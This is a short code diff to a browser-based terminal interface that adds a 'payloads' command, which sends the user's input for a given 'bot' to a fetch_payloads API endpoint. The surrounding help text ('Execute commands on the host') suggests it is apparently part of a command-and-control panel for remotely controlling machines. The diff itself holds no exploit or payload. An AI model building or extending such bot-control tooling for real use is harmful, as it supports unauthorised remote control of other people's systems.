@@ -43,6 +43,7 @@ var term = $('#term').terminal(function(cmd, term) {
   if (cmd == 'help') {
     term.echo(`\nAvailable commands are:
       command - Execute commands on the host
+      payloads - Execute payloads on the host
       banner - Display awesome ASCII art
       help - List available commands
       exit - Return to the main menu\n`)
@@ -51,6 +52,27 @@ var term = $('#term').terminal(function(cmd, term) {
   if (cmd == 'banner') {
     term.echo(banner)
   }
+
+  if (cmd == 'payloads') {
+    term.push(function(cmd, term) {
+      if (cmd == 'exit') {
+        term.pop();
+      } else {
+        var bot = window.location.pathname;
+        $.jrpc("/api/1.1/fetch_payloads", bot, cmd, function(json) {
+          if (!json.error) {
+            term.echo(json.result);
+          } else {
+            term.echo(json.error.message);
+          }
+        })
+      }
+    }, {
+      prompt: 'Payloads> ',
+    })
+
+  }
+
   // run commands on the system
   if (cmd == 'command') {
     term.push(function(cmd, term) {
